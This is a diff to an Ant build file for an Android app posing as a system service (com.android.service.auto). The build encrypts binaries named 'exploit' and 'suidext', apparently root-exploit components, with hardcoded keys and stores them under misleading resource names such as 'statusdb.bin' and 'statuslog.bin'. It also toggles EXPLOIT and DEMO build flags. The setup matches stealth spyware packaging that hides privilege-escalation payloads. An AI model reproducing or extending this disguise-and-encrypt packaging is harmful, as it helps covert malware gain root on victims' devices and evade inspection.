@@ -90,27 +90,49 @@
 		<filter token="DATE" value="${TODAY}" />
 	</filterset>
 
-	<taskdef name="crypter" classname="za.co.massdosage.ant.Crypter">
+	<taskdef name="crypter" classname="com.example.ant.Crypter">
 		<classpath>
 			<pathelement path="${basedir}/../crypter/build/archive/crypter-ant.jar" />
 		</classpath>
 	</taskdef>
 
-	<target name="encrypt-messages">
+	<taskdef name="random" classname="com.example.ant.RandomString">
+		<classpath>
+			<pathelement path="${basedir}/../crypter/build/archive/crypter-ant.jar" />
+			<fileset dir="${basedir}/../crypter/lib">
+				<include name="**/*.jar" />
+				<include name="**/*.zip" />
+			</fileset>
+		</classpath>
+	</taskdef>
+
+	<target name="salt">
+		<random len="8" property="randomSalt">
+		</random>
+		<echo>Random:${randomSalt}</echo>
+	</target>
+	
+	<target name="key">
+		<random len="8" property="randomKey">
+		</random>
+		<echo>Random:${randomKey}</echo>
+	</target>
+
+	<target name="encrypt-messages" depends="salt">
 		<delete file="res/raw/messages.bin" />
-		<crypter encrypt="true" keyFile="0x5A3D00448D7A912B" inputFile="preprocess/messages.properties.all" outputFile="res/raw/messages.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D00448D7A912B" inputFile="preprocess/messages.properties.all" outputFile="res/raw/messages.bin" />
 	</target>
 
-	<target name="encrypt-manifest">
+	<target name="encrypt-manifest" depends="salt">
 		<delete file="res/raw/layout.bin" />
-		<crypter encrypt="true" keyFile="0xA83E0F44BD7A4D20" inputFile="preprocess/ManifestSigned.apk" outputFile="res/raw/layout.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="0xA83E0F44BD7A4D20" inputFile="preprocess/ManifestSigned.apk" outputFile="res/raw/layout.bin" />
 	</target>
 
-	<target name="encrypt-exploit">
+	<target name="encrypt-exploit" depends="salt">
 		<delete file="res/raw/statusdb.bin" />
 		<delete file="res/raw/statuslog.bin" />
-		<crypter encrypt="true" keyFile="0x5A3D10448D7A912A" inputFile="libs/armeabi/suidext" outputFile="res/raw/statusdb.bin" />
-		<crypter encrypt="true" keyFile="0x5A3D10448D7A912B" inputFile="libs/armeabi/exploit" outputFile="res/raw/statuslog.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D10448D7A912A" inputFile="libs/armeabi/suidext" outputFile="res/raw/statusdb.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D10448D7A912B" inputFile="libs/armeabi/exploit" outputFile="res/raw/statuslog.bin" />
 	</target>
 
 	<target name="encrypt-noexploit">
@@ -141,8 +163,12 @@
 		<copy file="preprocess/Cfg.java" toFile="src/com/android/service/auto/Cfg.java" overwrite="true">
 			<filterset>
 				<filter token="DEBUG" value="true" />
+				<filter token="EXCEPTION" value="true" />
 				<filter token="EXPLOIT" value="false" />
-				<filter token="DEMO" value="true" />
+				<filter token="DEMO" value="false" />
+				<filter token="KEYS" value="true" />
+				<filter token="FILE" value="true" />
+				<filter token="RANDOM" value="${randomSalt}" />
 			</filterset>
 		</copy>
 		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
@@ -161,10 +187,12 @@
 		<copy file="preprocess/Cfg.java" toFile="src/com/android/service/auto/Cfg.java" overwrite="true">
 			<filterset>
 				<filter token="DEBUG" value="false" />
-				<filter token="EXP" value="false" />
+				<filter token="EXCEPTION" value="false" />
+				<filter token="EXPLOIT" value="false" />
 				<filter token="DEMO" value="false" />
 				<filter token="KEYS" value="false" />
 				<filter token="FILE" value="false" />
+				<filter token="RANDOM" value="${randomSalt}" />
 			</filterset>
 		</copy>
 		<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
@@ -182,9 +210,13 @@
 		</copy>
 		<copy file="preprocess/Cfg.java" toFile="src/com/android/service/auto/Cfg.java" overwrite="true">
 			<filterset>
-				<filter token="DEBUG" value="true" />
+				<filter token="DEBUG" value="false" />
+				<filter token="EXCEPTION" value="false" />
 				<filter token="EXPLOIT" value="false" />
 				<filter token="DEMO" value="true" />
+				<filter token="KEYS" value="false" />
+				<filter token="FILE" value="false" />
+				<filter token="RANDOM" value="${randomSalt}" />
 			</filterset>
 		</copy>
 		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
@@ -203,8 +235,12 @@
 		<copy file="preprocess/Cfg.java" toFile="src/com/android/service/auto/Cfg.java" overwrite="true">
 			<filterset>
 				<filter token="DEBUG" value="true" />
+				<filter token="EXCEPTION" value="true" />
 				<filter token="EXPLOIT" value="true" />
 				<filter token="DEMO" value="true" />
+				<filter token="KEYS" value="false" />
+				<filter token="FILE" value="false" />
+				<filter token="RANDOM" value="${randomSalt}" />
 			</filterset>
 		</copy>
 		<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
@@ -291,7 +327,7 @@
 		</checksum>
 
 	</target>
-	
+
 	<import file="${sdk.dir}/tools/ant/build.xml" />
 
 </project>
